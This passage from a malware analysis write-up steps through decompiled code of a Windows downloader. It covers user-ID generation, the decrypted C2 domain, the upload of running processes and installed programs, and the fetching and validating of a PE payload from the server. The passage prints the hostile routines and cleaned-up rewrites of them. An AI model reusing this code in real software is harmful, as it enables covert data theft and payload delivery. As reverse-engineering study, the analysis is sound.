      DWORD1(WindowName),
      DWORD2(WindowName),
      HIDWORD(WindowName));
  }
  DeleteFileAfterReboot(hModule);
  ```

  The first `DeleteFileAfterReboot` uses NULL; thus the program that loads the payload (i.e. the stub or the first program we analyzed above) will be deleted after a reboot; while the second call `DeleteFileAfterReboot` is for the current module, ie. the payload itself.

Let's now analyze `sub_401570` which is where we'll find out what type of malware we're analyzing:
#### Code 21.5
```cpp
void __noreturn sub_401570()
{
  LPVOID lpMem; // [esp+4h] [ebp-10h] BYREF
  DWORD nNumberOfBytesToWrite; // [esp+8h] [ebp-Ch] BYREF
  LPCVOID lpBuffer; // [esp+Ch] [ebp-8h] BYREF
  HANDLE hObject; // [esp+10h] [ebp-4h]

  lpBuffer = 0;
  nNumberOfBytesToWrite = 0;
  lpMem = 0;
  CreateMutex(0);
  hObject = CreateThread(0, 0, StartAddress, 0, 0, 0);
  CreateNamedEventAndSetLowIntegrity(String);
  while ( 1 )
  {
    while ( sub_4021C0((int)&lpBuffer, &nNumberOfBytesToWrite, 0) < 0 || !nNumberOfBytesToWrite )
    {
      lpBuffer = 0;
      Sleep(0x3A98u);
    }
    CreateNamedEventAndSetLowIntegrity(dword_401168);
    if ( !sub_4021A0(lpBuffer, nNumberOfBytesToWrite)
      && *(_WORD *)lpBuffer == 23117
      && *(_WORD *)((char *)lpBuffer + *((_DWORD *)lpBuffer + 15)) == 17744 )
    {
      break;
    }
    sub_402890((LPVOID)lpBuffer);
    lpBuffer = 0;
  }
  CreateNamedEventAndSetLowIntegrity(dword_401164);
  if ( !sub_401DB0((int)&lpMem, lpBuffer, nNumberOfBytesToWrite) )
  {
    CreateNamedEventAndSetLowIntegrity(dword_401160);
    sub_401A70((LPCSTR)lpMem, 0, 0);
    CreateNamedEventAndSetLowIntegrity(dword_40115C);
  }
  if ( lpMem )
    sub_401D90(lpMem);
  if ( hObject )
    CloseHandle(hObject);
  sub_402890((LPVOID)lpBuffer);
  ExitThread(0);
}
```
I already renamed some functions, specifically
- `CreateMutex` should be self-explainatory,
- `CreateNamedEventAndSetLowIntegrity` creates a named event (an event is a synchronization mechanism that can be waited on or signaled, similar to multithreading synchronization mechanism) and sets it some security flags which we'll not analyze for now.

Next we can see:
```cpp
while ( 1 )
{
  while ( sub_4021C0((int)&lpBuffer, &nNumberOfBytesToWrite, 0) < 0 || !nNumberOfBytesToWrite )
  {
    lpBuffer = 0;
    Sleep(15000u);
  }
```
So let's go step by step and analyze sub_4021C0.
#### Code 23
```cpp
int __cdecl sub_4021C0(int a1, LPDWORD lpdwNumberOfBytesRead, int a3)
{
  CHAR szServerName[64]; // [esp+8h] [ebp-158h] BYREF
  char Buffer[256]; // [esp+48h] [ebp-118h] BYREF
  int v6; // [esp+14Ch] [ebp-14h] BYREF
  int v7[3]; // [esp+150h] [ebp-10h]
  int v8; // [esp+15Ch] [ebp-4h]

  v7[0] = (int)",('j(]Y\\[hh#Xdb";
  v7[1] = (int)"ldeZni_WhWkbkZ#Xdb";
  v7[2] = (int)",('j(]Y\\[hh#Xdb";
  v8 = -2147467259;
  v6 = 0;
  if ( !dword_405384 )
  {
    qword_405378 = sub_403040();
    dword_405384 = 1;
  }
  while ( 1 )
  {
    if ( (unsigned int)dword_405380 >= 3 )
      dword_405380 = 0;
    memset(szServerName, 0, sizeof(szServerName));
    sub_402850(v7[dword_405380], szServerName);
    if ( a3 )
      v8 = sub_4028E0(
             Buffer,
             256,
             "searcho?fr=altavista&itag=ody&q=%s%%2C%02x%02x%02x%02x%02x%02x%02x%02x%s&kgs=1&kls=0&p=%d",
             (char)"LJRf0SCBd_PQg6");
    else
      v8 = sub_4028E0(
             Buffer,
             256,
             "searcho?fr=altavista&itag=ody&q=%s%%2C%02x%02x%02x%02x%02x%02x%02x%02x%s&kgs=1&kls=0",
             (char)"LJRf0SCBd_PQg6");
    if ( v8 < 0 )
      return v8;
    v6 = 0;
    v8 = sub_402580(a1, lpdwNumberOfBytesRead, szServerName, Buffer, (int)&v6, a3);
    if ( v6 == 200 )
      dword_405054 = 0;
    if ( v8 >= 0 )
      break;
    Sleep(0x64u);
    ++dword_405380;
  }
  return v8;
}
```
Let's first analyze the first part of **Code 23**:
#### Code 24
```cpp
if ( !dword_405384 )
{
  qword_405378 = sub_403040();
  dword_405384 = 1;
}
```
#### Code 24.5
```cpp
unsigned __int64 sub_403040()
{
  int v1; // ecx
  __int64 v2; // rax
  HANDLE ProcessHeap; // eax
  void *lpMem; // [esp+Ch] [ebp-Ch]
  __int64 v5; // [esp+10h] [ebp-8h]

  lpMem = (void *)sub_403100();
  if ( !lpMem || !*(_DWORD *)lpMem )
    return 0xBAD1D11100000000ui64;
  sub_403290(*(_DWORD *)lpMem + 8, *(unsigned __int8 *)(*(_DWORD *)lpMem + 1));
  sub_403410();
  LOBYTE(v1) = 32;
  v2 = sub_403E90(v1, 0);
  HIDWORD(v5) = HIDWORD(v2);
  LODWORD(v5) = v2 | sub_403410();
  ProcessHeap = GetProcessHeap();
  HeapFree(ProcessHeap, 0, lpMem);
  return v5;
}
```
#### Code 25
```cpp
int __cdecl sub_403290(int a1, int a2)
{
  int result; // eax
  int v3; // [esp+0h] [ebp-10h]
  int v4; // [esp+4h] [ebp-Ch]
  int i; // [esp+8h] [ebp-8h]
  int j; // [esp+8h] [ebp-8h]
  int v7; // [esp+Ch] [ebp-4h]

  result = sub_403200(19650218);
  v7 = 1;
  v4 = 0;
  if ( a2 >= 624 )
  {
    result = a2;
    v3 = a2;
  }
  else
  {
    v3 = 624;
  }
  for ( i = v3; i; --i )
  {
    dword_4056A8[v7] = v4
                     + *(_DWORD *)(a1 + 4 * v4)
                     + (dword_4056A8[v7] ^ (1664525 * (dword_4056A4[v7] ^ ((unsigned int)dword_4056A4[v7] >> 30))));
    dword_4056A8[v7] = dword_4056A8[v7];
    ++v7;
    ++v4;
    if ( v7 >= 624 )
    {
      dword_4056A8[0] = dword_406064;
      v7 = 1;
    }
    result = v4;
    if ( v4 >= a2 )
      v4 = 0;
  }
  for ( j = 623; j; --j )
  {
    dword_4056A8[v7] = (dword_4056A8[v7] ^ (1566083941 * (dword_4056A4[v7] ^ ((unsigned int)dword_4056A4[v7] >> 30))))
                     - v7;
    result = v7;
    dword_4056A8[v7] = dword_4056A8[v7];
    if ( ++v7 >= 624 )
    {
      result = dword_406064;
      dword_4056A8[0] = dword_406064;
      v7 = 1;
    }
  }
  dword_4056A8[0] = 0x80000000;
  return result;
}
```
#### Code 25.5
```cpp
int __cdecl sub_403200(int a1)
{
  int result; // eax

  result = a1;
  dword_4056A8[0] = a1;
  for ( dword_40535C = 1; dword_40535C < 624; ++dword_40535C )
  {
    dword_4056A8[dword_40535C] = dword_40535C
                               + 1812433253
                               * (dword_4056A4[dword_40535C] ^ ((unsigned int)dword_4056A4[dword_40535C] >> 30));
    result = dword_40535C;
    dword_4056A8[dword_40535C] = dword_4056A8[dword_40535C];
  }
  return result;
}
```
This may look very complicated at first; but if we look up the given constants on google (for example `1812433253`) we notice that the first result is Mersenne Twister (https://en.wikipedia.org/wiki/Mersenne_Twister).
To confirm that this code is just a mersenne twister implementation, we can check any implementation of mersenne twister, and it turns out that our assumptions is correct.

Mersenne Twister implementation example: https://www.math.sci.hiroshima-u.ac.jp/m-mat/MT/MT2002/CODES/mt19937ar.c

- **Code 25.5** is identical to `init_genrand` in the link I provided.
- **Code 25** is pretty much `init_by_array`.

Checking the next function in **Code 24.5**:
```cpp
unsigned int sub_403410()
{
  int i; // [esp+0h] [ebp-8h]
  unsigned int v2; // [esp+4h] [ebp-4h]
  unsigned int v3; // [esp+4h] [ebp-4h]
  unsigned int v4; // [esp+4h] [ebp-4h]
  unsigned int v5; // [esp+4h] [ebp-4h]

  if ( dword_40535C >= 624 )
  {
    if ( dword_40535C == 625 )
      initialize_state_mersenne(5489);
    for ( i = 0; i < 227; ++i )
    {
      v2 = dword_4056AC[i] & 0x7FFFFFFF | dword_4056A8[i] & 0x80000000;
      dword_4056A8[i] = dword_405360[v2 & 1] ^ dword_405CDC[i] ^ (v2 >> 1);
    }
    while ( i < 623 )
    {
      v3 = dword_4056AC[i] & 0x7FFFFFFF | dword_4056A8[i] & 0x80000000;
      dword_4056A8[i] = dword_405360[v3 & 1] ^ dword_40531C[i] ^ (v3 >> 1);
      ++i;
    }
    dword_406064 = dword_405360[dword_4056A8[0] & 1] ^ dword_405CD8 ^ ((dword_4056A8[0] & 0x7FFFFFFF | dword_406064 & 0x80000000) >> 1);
    dword_40535C = 0;
  }
  v4 = dword_4056A8[dword_40535C++];
  v5 = v4 ^ (v4 >> 11) ^ ((v4 ^ (v4 >> 11)) << 7) & 0x9D2C5680;
  return v5 ^ (v5 << 15) & 0xEFC60000 ^ ((v5 ^ (v5 << 15) & 0xEFC60000) >> 18);
}
```
This is identical to `genrand_int32`.

Finally, note that the first function in **Code 24.5**: `sub_403100` just retrieves an TokenUser by calling Windows' `GetTokenInformation`.

Finally, it turns out **Code 24.5** is just generating an UserID:
```cpp
unsigned __int64 GenerateUserID()
{
  int v1; // ecx
  __int64 v2; // rax
  HANDLE ProcessHeap; // eax
  void *lpMem; // [esp+Ch] [ebp-Ch]
  __int64 randomNum; // [esp+10h] [ebp-8h]

  lpMem = (void *)sub_403100();
  if ( !lpMem || !*(_DWORD *)lpMem )
    return 0xBAD1D11100000000ui64;
  init_mersenne_by_array(*(_DWORD *)lpMem + 8, *(unsigned __int8 *)(*(_DWORD *)lpMem + 1));
  generate_random_num();
  LOBYTE(v1) = 32;
  v2 = sub_403E90(v1, 0);
  HIDWORD(randomNum) = HIDWORD(v2);
  LODWORD(randomNum) = v2 | generate_random_num();
  ProcessHeap = GetProcessHeap();
  HeapFree(ProcessHeap, 0, lpMem);
  return randomNum;
}
```
This UserID will be used later.
**Code 24** can be rewritten as:
```cpp
if ( !hasUserIdBeenGenerated )
{
  UserID = GenerateUserID();
  hasUserIdBeenGenerated = 1;
}
```

Now proceeding with **Code 23**, we easily see that `sub_402850(v7[dword_405380], szServerName);` is just a simple decryption function. The debugger shows the final szServerName, which appears to be `732u3hdgfss.com`.

Checking further in **Code 23** while debugging, if we try to decompile the code after the if statement, IDA rewrites the function call to `sub_4028E0` as:
```cpp
 v3 = sub_4028E0(
   Buffer,
   256,
   "searcho?fr=altavista&itag=ody&q=%s%%2C%02x%02x%02x%02x%02x%02x%02x%02x%s&kgs=1&kls=0&p=%d",
   "LJRf0SCBd_PQg6",
   (unsigned __int8)UserID,
   BYTE1(UserID),
   BYTE2(UserID),
   BYTE3(UserID),
   BYTE4(UserID),
   BYTE5(UserID),
   BYTE6(UserID),
   HIBYTE(UserID),
   (const char *)&dword_401304,
   a3);
```
If we check the implementation of `sub_4028E0` it just seems to be `snprintf`.
The "Buffer" ends up containing (in my case): `"searcho?fr=altavista&itag=ody&q=LJRf0SCBd_PQg6%2Ce61bcb45eae47ce1&kgs=1&kls=0&p=21"`

So **Code 23** so far is building an URL to a C2 server with my specific UserID information. This smells like a stager, but let's analyze further.

The only thing left to analyze in **Code 23** is this line:
```cpp
v10 = sub_402580(a1, lpdwNumberOfBytesRead, szServerName, Buffer, (int)&v8, a3);
```

#### Code 26
```cpp
int __cdecl sub_402580(LPVOID *a1,LPDWORD lpdwNumberOfBytesRead,LPCSTR lpszServerName,LPCSTR lpszObjectName,_DWORD *a5,int a6)
{
  HANDLE ProcessHeap; // eax
  HANDLE v8; // eax
  void *lpOptional; // [esp+8h] [ebp-5Ch]
  int Buffer; // [esp+Ch] [ebp-58h] BYREF
  int v11; // [esp+10h] [ebp-54h]
  DWORD dwBufferLength; // [esp+14h] [ebp-50h] BYREF
  HINTERNET hRequest; // [esp+18h] [ebp-4Ch]
  HINTERNET hConnect; // [esp+1Ch] [ebp-48h]
  int v15; // [esp+20h] [ebp-44h] BYREF
  DWORD dwOptionalLength; // [esp+24h] [ebp-40h] BYREF
  CHAR szHeaders[48]; // [esp+28h] [ebp-3Ch] BYREF
  DWORD dwFlags; // [esp+5Ch] [ebp-8h]
  HINTERNET hInternet; // [esp+60h] [ebp-4h]

  v11 = -2147467259;
  hInternet = 0;
  hConnect = 0;
  hRequest = 0;
  Buffer = 60000;
  dwFlags = -2075655680;
  v15 = 0;
  dwBufferLength = 4;
  lpOptional = 0;
  dwOptionalLength = 0;
  strcpy(szHeaders, "Content-Type: application/x-www-form-urlencoded");
  if ( !a1 || !lpdwNumberOfBytesRead )
    return -2147467259;
  InternetSetOptionA(0, 6u, &Buffer, 4u);
  InternetSetOptionA(0, 5u, &Buffer, 4u);
  InternetSetOptionA(0, 2u, &Buffer, 4u);
  hInternet = InternetOpenA(0, 0, 0, 0, 0);
  if ( !hInternet )
    return -2147467259;
  hConnect = InternetConnectA(hInternet, lpszServerName, 0x50u, 0, 0, 3u, 0, 0);
  if ( hConnect )
  {
    hRequest = HttpOpenRequestA(hConnect, a6 == 0 ? "POST" : 0, lpszObjectName, 0, 0, 0, dwFlags, 0);
    if ( hRequest )
    {
      if ( a6
        || (ProcessHeap = GetProcessHeap(), (lpOptional = HeapAlloc(ProcessHeap, 8u, 0x2800u)) != 0)
        && !sub_403AC0(lpOptional, 10240)
        && !sub_4035B0(lpOptional, 10240)
        && (int)sub_402940(lpOptional, 10240, &dwOptionalLength) >= 0 )
      {
        if ( HttpSendRequestA(hRequest, szHeaders, 0x2Fu, lpOptional, dwOptionalLength)
          && HttpQueryInfoA(hRequest, 0x20000013u, &v15, &dwBufferLength, 0) )
        {
          if ( a5 )
            *a5 = v15;
          if ( v15 == 200 )
          {
            *a1 = VirtualAlloc(0, 0x200000u, 0x1000u, 4u);
            if ( *a1 )
            {
              if ( InternetReadFile(hRequest, *a1, 0x200000u, lpdwNumberOfBytesRead) )
              {
                v11 = 0;
              }
              else
              {
                VirtualFree(*a1, 0, 0x8000u);
                *a1 = 0;
              }
            }
          }
        }
      }
    }
  }
  if ( lpOptional )
  {
    v8 = GetProcessHeap();
    HeapFree(v8, 0, lpOptional);
  }
  if ( hRequest )
    InternetCloseHandle(hRequest);
  if ( hConnect )
    InternetCloseHandle(hConnect);
  if ( hInternet )
    InternetCloseHandle(hInternet);
  return v11;
}
```

This is almost plain english but is a pretty relevant function. One can find out what each function here does by reading the Microsoft docs. Before explaining what this function does, let's check `sub_403AC0` (0), `sub_4035B0` (1) and `sub_402940` (2) first so we can rename them. 
```cpp
// (0)
int __cdecl sub_403AC0(int a1, int a2)
{
  HANDLE hSnapshot; // [esp+0h] [ebp-134h]
  PROCESSENTRY32 pe; // [esp+4h] [ebp-130h] BYREF

  hSnapshot = CreateToolhelp32Snapshot(2u, 0);
  if ( hSnapshot == (HANDLE)-1 )
    return -1;
  pe.dwSize = 296;
  if ( Process32First(hSnapshot, &pe) )
  {
    do
    {
      sub_403A10(a1, a2, pe.szExeFile);
      sub_403A10(a1, a2, "\n");
    }
    while ( Process32Next(hSnapshot, &pe) );
    CloseHandle(hSnapshot);
    return 0;
  }
  else
  {
    CloseHandle(hSnapshot);
    return -2;
  }
}

int __stdcall sub_403A10(int a1, int a2, int a3)
{
  int v4; // [esp+0h] [ebp-8h] BYREF
  int v5; // [esp+4h] [ebp-4h]

  v5 = sub_403800(a1, a2, &v4, 0x7FFFFFFF);
  if ( v5 >= 0 )
    return sub_4038D0(v4 + a1, a2 - v4, 0, a3, 0x7FFFFFFF);
  return v5;
}
```

First of all, (0) is taking a snapshot of all active processes (see https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot).
After checking the sub it calls, we can rewrite it as:
```cpp
int __cdecl sub_403AC0(char *buffer, int bufferSize)
{
  HANDLE hSnapshot; // [esp+0h] [ebp-134h]
  PROCESSENTRY32 pe; // [esp+4h] [ebp-130h] BYREF

  hSnapshot = CreateToolhelp32Snapshot('\x02', 0);
  if ( hSnapshot == (HANDLE)-1 )
    return -1;
  pe.dwSize = 296;
  if ( Process32First(hSnapshot, &pe) )
  {
    do
    {
      appendStringToBuff((int)buffer, bufferSize, (int)pe.szExeFile);
      appendStringToBuff((int)buffer, bufferSize, (int)"\n");
    }
    while ( Process32Next(hSnapshot, &pe) );
    CloseHandle(hSnapshot);
    return 0;
  }
  else
  {
    CloseHandle(hSnapshot);
    return -2;
  }
}
```
This is taking a snapshot of all processes; for each process, its executable name is appended to the buffer as a string.
We can thus rename the function to something like ^AppendAllActiveProcessExeNames`.

Let's proceed with (1):
```cpp
// (1)
int __cdecl sub_4035B0(int a1, int a2)
{
  HKEY hKey; // [esp+8h] [ebp-630h] BYREF
  DWORD v5; // [esp+Ch] [ebp-62Ch]
  CHAR Name[1028]; // [esp+10h] [ebp-628h] BYREF
  HKEY phkResult; // [esp+414h] [ebp-224h] BYREF
  BYTE v8[264]; // [esp+418h] [ebp-220h] BYREF
  BYTE Data[268]; // [esp+520h] [ebp-118h] BYREF
  DWORD cbData; // [esp+630h] [ebp-8h] BYREF
  DWORD Type; // [esp+634h] [ebp-4h] BYREF

  memset(Name, 0, 1024);
  memset(v8, 0, 261);
  memset(Data, 0, 261);
  Type = 1;
  cbData = 260;
  if ( RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0, 8u, &phkResult) )
    return -1;
  v5 = 0;
  while ( !RegEnumKeyA(phkResult, v5++, Name, 0x104u) )
  {
    if ( !RegOpenKeyExA(phkResult, Name, 0, 1u, &hKey) )
    {
      memset(Data, 0, 0x105u);
      Type = 1;
      cbData = 260;
      if ( !RegQueryValueExA(hKey, "DisplayName", 0, &Type, Data, &cbData) && cbData )
      {
        memset(v8, 0, 0x105u);
        Type = 1;
        cbData = 260;
        RegQueryValueExA(hKey, "DisplayVersion", 0, &Type, v8, &cbData);
        if ( !sub_403A60(Name, 1024, "%s|%s\n", (char)Data) )
          appendStringToBuff(a1, a2, Name);
      }
      RegCloseKey(hKey);
    }
  }
  RegCloseKey(phkResult);
  return 0;
}
```
In Windows, installed programs info can be found in the registry key `Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall`. For each installed program, the malware is:
- Opening it,
- Then reads `DisplayName` and `DisplayVersion`
- and finally appends the string "DisplayName | DisplayVersion" for each installed program to the buffer.

We can rename this whole function to `AppendInstalledProgramsInfo`.
After analyzing (2) we can see easily that it is getting the buffer's length (the buffer in our case contains strings):
```cpp
int __stdcall sub_402470(_BYTE *buffer, int bufferSize, _DWORD *outBufferSize)
{
  int v4; // [esp+0h] [ebp-8h]
  int initialBufferSize; // [esp+4h] [ebp-4h]

  v4 = 0;
  initialBufferSize = bufferSize;
  while ( bufferSize && *buffer )
  {
    ++buffer;
    --bufferSize;
  }
  if ( !bufferSize )
    v4 = -2147024809;
  if ( outBufferSize )
  {
    if ( v4 < 0 )
      *outBufferSize = 0;
    else
      *outBufferSize = initialBufferSize - bufferSize;
  }
  return v4;
}
```

Getting back to **Code 26**, we now know that this:
```cpp
hRequest = HttpOpenRequestA(hConnect, a6 == 0 ? "POST" : 0, lpszObjectName, 0, 0, 0, dwFlags, 0);
if ( hRequest )
{
  if ( a6
    || (ProcessHeap = GetProcessHeap(), (lpOptional = HeapAlloc(ProcessHeap, 8u, 0x2800u)) != 0)
    && !sub_403AC0(lpOptional, 10240)
    && !sub_4035B0(lpOptional, 10240)
    && (int)sub_402940(lpOptional, 10240, &dwOptionalLength) >= 0 )
```

Can be renamed to this:
```cpp
 if ( a6|| (ProcessHeap = GetProcessHeap(), (buff = HeapAlloc(ProcessHeap, 8u, 0x2800u)) != 0)
  && !AppendAllActiveProcessExeNames(buff, 10240)
  && !AppendInstalledProgramsInfo(buff, 10240)
  && (int)getRealBufferSize(buff, 10240, &realBufferLength) >= 0 )
```

So what happens is that our `buff` will now contain multiple strings for:
- Each active process => related EXE name,
- Each installed program => formatted as DisplayName | DisplayVersion

Now we can explain what Code 26 actually does:
1) Connects to the C2 server (which we found out before to be `732u3hdgfss.com`) with `hConnect = InternetConnectA(hInternet, lpszServerName, 0x50u, 0, 0, 3u, 0, 0)`
2) Opens a HTTP request (`hRequest = HttpOpenRequestA(hConnect, IsGetReq == 0 ? "POST" : 0, lpszObjectName, 0, 0, 0, dwFlags, 0);`), specifically using `"searcho?fr=altavista&itag=ody&q=LJRf0SCBd_PQg6%2Ce61bcb45eae47ce1&kgs=1&kls=0&p=21"`
3) Retrieves all active process EXE names, installed programs info, and appends everything as strings into a buffer
4) Sends the buffer to `732u3hdgfss.com/searcho?fr=altavista&itag=ody&q=LJRf0SCBd_PQg6%2Ce61bcb45eae47ce1&kgs=1&kls=0&p=21` (`HttpSendRequestA(hRequest, szHeaders, 0x2Fu, buff, realBufferLength`) ==> Note that this link depends on the generated UserID, so each User that runs the malware will have their specific URL.
   **Note** that the buffer is sent only if the last function argument is 1.
6) Checks the C2's server response: if 200 (HTTP OK) stores it in `a5`, and stores the server's response in the first parameter (`InternetReadFile(hRequest, *a1, 0x200000u, lpdwNumberOfBytesRead)`).

Finally, we can rewrite **Code 26** as:
```cpp
int __cdecl SendInfoAndRetrieveResponse(
        LPVOID *serverResponseOut,
        LPDWORD lpdwNumberOfBytesRead,
        LPCSTR lpszServerName,
        LPCSTR lpszObjectName,
        _DWORD *httpStatusCodeOut,
        int IsGetReq)
{
  HANDLE ProcessHeap; // eax
  HANDLE v8; // eax
  _BYTE *buff; // [esp+8h] [ebp-5Ch]
  int Buffer; // [esp+Ch] [ebp-58h] BYREF
  int v11; // [esp+10h] [ebp-54h]
  DWORD dwBufferLength; // [esp+14h] [ebp-50h] BYREF
  HINTERNET hRequest; // [esp+18h] [ebp-4Ch]
  HINTERNET hConnect; // [esp+1Ch] [ebp-48h]
  int v15; // [esp+20h] [ebp-44h] BYREF
  DWORD realBufferLength; // [esp+24h] [ebp-40h] BYREF
  CHAR szHeaders[48]; // [esp+28h] [ebp-3Ch] BYREF
  DWORD dwFlags; // [esp+5Ch] [ebp-8h]
  HINTERNET hInternet; // [esp+60h] [ebp-4h]

  v11 = -2147467259;
  hInternet = 0;
  hConnect = 0;
  hRequest = 0;
  Buffer = 60000;
  dwFlags = -2075655680;
  v15 = 0;
  dwBufferLength = 4;
  buff = 0;
  realBufferLength = 0;
  strcpy(szHeaders, "Content-Type: application/x-www-form-urlencoded");
  if ( !serverResponseOut || !lpdwNumberOfBytesRead )
    return -2147467259;
  InternetSetOptionA(0, 6u, &Buffer, 4u);
  InternetSetOptionA(0, 5u, &Buffer, 4u);
  InternetSetOptionA(0, 2u, &Buffer, 4u);
  hInternet = InternetOpenA(0, 0, 0, 0, 0);
  if ( !hInternet )
    return -2147467259;
  hConnect = InternetConnectA(hInternet, lpszServerName, 0x50u, 0, 0, 3u, 0, 0);
  if ( hConnect )
  {
    hRequest = HttpOpenRequestA(hConnect, IsGetReq == 0 ? "POST" : 0, lpszObjectName, 0, 0, 0, dwFlags, 0);
    if ( hRequest )
    {                                           // only send data to server if the caller specified IsGetReq = FALSE
      if ( IsGetReq
        || (ProcessHeap = GetProcessHeap(), (buff = HeapAlloc(ProcessHeap, 8u, 0x2800u)) != 0)
        && !AppendAllActiveProcessExeNames(buff, 10240)
        && !AppendInstalledProgramsInfo(buff, 0x2800u)
        && getRealBufferSize(buff, 0x2800u, &realBufferLength) >= 0 )
      {
        if ( HttpSendRequestA(hRequest, szHeaders, 0x2Fu, buff, realBufferLength)
          && HttpQueryInfoA(hRequest, 0x20000013u, &v15, &dwBufferLength, 0) )
        {
          if ( httpStatusCodeOut )
            *httpStatusCodeOut = v15;
          if ( v15 == 200 )
          {
            *serverResponseOut = VirtualAlloc(0, 0x200000u, 0x1000u, 4u);
            if ( *serverResponseOut )
            {
              if ( InternetReadFile(hRequest, *serverResponseOut, 0x200000u, lpdwNumberOfBytesRead) )
              {
                v11 = 0;
              }
              else
              {
                VirtualFree(*serverResponseOut, 0, 0x8000u);
                *serverResponseOut = 0;
              }
            }
          }
        }
      }
    }
  }
  if ( buff )
  {
    v8 = GetProcessHeap();
    HeapFree(v8, 0, buff);
  }
  if ( hRequest )
    InternetCloseHandle(hRequest);
  if ( hConnect )
    InternetCloseHandle(hConnect);
  if ( hInternet )
    InternetCloseHandle(hInternet);
  return v11;
}
```

Finally, we can also see how **Code 23** looks like:
```cpp
int __cdecl GenIdAndStartC2Communication(LPVOID *serverResponse, LPDWORD lpdwNumberOfBytesRead, int isGetReq)
{
  int v3; // eax
  int v4; // eax
  CHAR szServerName[64]; // [esp+8h] [ebp-158h] BYREF
  char Buffer[256]; // [esp+48h] [ebp-118h] BYREF
  int httpStatusCode; // [esp+14Ch] [ebp-14h] BYREF
  int v9[3]; // [esp+150h] [ebp-10h]
  int success; // [esp+15Ch] [ebp-4h]

  v9[0] = (int)",('j(]Y\\[hh#Xdb";
  v9[1] = (int)"ldeZni_WhWkbkZ#Xdb";
  v9[2] = (int)",('j(]Y\\[hh#Xdb";
  success = -2147467259;
  httpStatusCode = 0;
  if ( !hasUserIdBeenGenerated )
  {
    UserID = GenerateUserID();
    hasUserIdBeenGenerated = 1;
  }
  while ( 1 )
  {
    if ( (unsigned int)dword_405380 >= 3 )
      dword_405380 = 0;
    memset(szServerName, 0, sizeof(szServerName));
    decryptString(v9[dword_405380], (int)szServerName);
    if ( isGetReq )
    {
      if ( IsNotHttpStatus200 )
        v3 = snprintf(
               Buffer,
               256,
               "searcho?fr=altavista&itag=ody&q=%s%%2C%02x%02x%02x%02x%02x%02x%02x%02x%s&kgs=1&kls=0&p=%d",
               "LJRf0SCBd_PQg6",
               (unsigned __int8)UserID,
               BYTE1(UserID),
               BYTE2(UserID),
               BYTE3(UserID),
               BYTE4(UserID),
               BYTE5(UserID),
               BYTE6(UserID),
               HIBYTE(UserID),
               (const char *)&dword_401304,
               isGetReq);
      else
        v3 = snprintf(
               Buffer,
               256,
               "searcho?fr=altavista&itag=ody&q=%s%%2C%02x%02x%02x%02x%02x%02x%02x%02x%s&kgs=1&kls=0&p=%d",
               "LJRf0SCBd_PQg6",
               (unsigned __int8)UserID,
               BYTE1(UserID),
               BYTE2(UserID),
               BYTE3(UserID),
               BYTE4(UserID),
               BYTE5(UserID),
               BYTE6(UserID),
               HIBYTE(UserID),
               "%2C1E4cjB9cQNjj",
               isGetReq);
      success = v3;
    }
    else
    {
      if ( IsNotHttpStatus200 )
        v4 = snprintf(
               Buffer,
               256,
               "searcho?fr=altavista&itag=ody&q=%s%%2C%02x%02x%02x%02x%02x%02x%02x%02x%s&kgs=1&kls=0",
               "LJRf0SCBd_PQg6",
               (unsigned __int8)UserID,
               BYTE1(UserID),
               BYTE2(UserID),
               BYTE3(UserID),
               BYTE4(UserID),
               BYTE5(UserID),
               BYTE6(UserID),
               HIBYTE(UserID),
               (const char *)&dword_401304);
      else
        v4 = snprintf(
               Buffer,
               256,
               "searcho?fr=altavista&itag=ody&q=%s%%2C%02x%02x%02x%02x%02x%02x%02x%02x%s&kgs=1&kls=0",
               "LJRf0SCBd_PQg6",
               (unsigned __int8)UserID,
               BYTE1(UserID),
               BYTE2(UserID),
               BYTE3(UserID),
               BYTE4(UserID),
               BYTE5(UserID),
               BYTE6(UserID),
               HIBYTE(UserID),
               "%2C1E4cjB9cQNjj");
      success = v4;
    }
    if ( success < 0 )
      return success;
    httpStatusCode = 0;
    success = SendInfoAndRetrieveResponse(
                serverResponse,
                lpdwNumberOfBytesRead,
                szServerName,
                Buffer,
                &httpStatusCode,
                isGetReq);
    if ( httpStatusCode == 200 )
      IsNotHttpStatus200 = 0;
    if ( success >= 0 )
      break;
    Sleep(0x64u);
    ++dword_405380;
  }
  return success;
}
```
- First, a UserID is generated.
- Next, the server name is found along with an user-specific link that will be accessed.
- Next, the C2 server is contacted; some info like process exe names/installed program info is sent to it depending on `isGetReq`. (these info are sent only if the caller specifies `isGetReq = false`
- The function wants the C2 server to respond with a valid HTTP status code (200). The server's response is stored.

We can now get back to **Code 21.5**. The first half of it is basically just
```cpp
while ( 1 )
{
  while ( GenIdAndStartC2Communication((LPVOID *)&serverResponse, &nNumberOfBytesToWrite, 0) < 0
       || !nNumberOfBytesToWrite )
  { // send  process/installed programs info to C2 + wait correct response
    serverResponse = 0;
    Sleep(15000u);
  }
  CreateNamedEventAndSetLowIntegrity(C2ResponseReceived); // update other threads/processes 
  if ( !decryptServerResponse((int)serverResponse, nNumberOfBytesToWrite)
    && *(_WORD *)serverResponse == 0x5A4D // Check if valid MZ signature in DOS
    && *(_WORD *)((char *)serverResponse + *((_DWORD *)serverResponse + 15)) == 0x4550 )
  { // Check if valid "PE" signature 
    break; // if C2 send valid PE, break from loop
  }
  VirtualFreeFn((LPVOID)serverResponse);
  serverResponse = 0;
}
CreateNamedEventAndSetLowIntegrity(ServerResponseValidPE); // update other threads/processes
```
I already analyzed the `decryptServerResponse` so we can focus on the important parts.
We already saw the pattern for checking "MZ" and "PE" signature previously so we don't need to repeat that.

Basically, this part of **Code 21.5** is simply 
- Contacting the C2 server as explained before,
- Retrieving a response,
- Checking if the response is an actual PE file.

Now we need to analyze the last part of **Code 21.5**:
#### Code 27
```cpp
if ( !sub_401DB0((LPSTR *)&lpMem, serverResponse, nNumberOfBytesToWrite) )
{
  CreateNamedEventAndSetLowIntegrity(dword_401160);
  sub_401A70((LPCSTR)lpMem, 0, 0);
  CreateNamedEventAndSetLowIntegrity(dword_40115C);
}
```
First, `sub_401DB0` is
```cpp
int __cdecl sub_401DB0(LPSTR *filePath, LPCVOID serverResponse, DWORD responseSize)
{
  HANDLE ProcessHeap; // eax
  CHAR PrefixString; // [esp+3h] [ebp-Dh] BYREF
  DWORD NumberOfBytesWritten; // [esp+4h] [ebp-Ch] BYREF
  HANDLE hFile; // [esp+8h] [ebp-8h]
  DWORD TempPathA; // [esp+Ch] [ebp-4h]

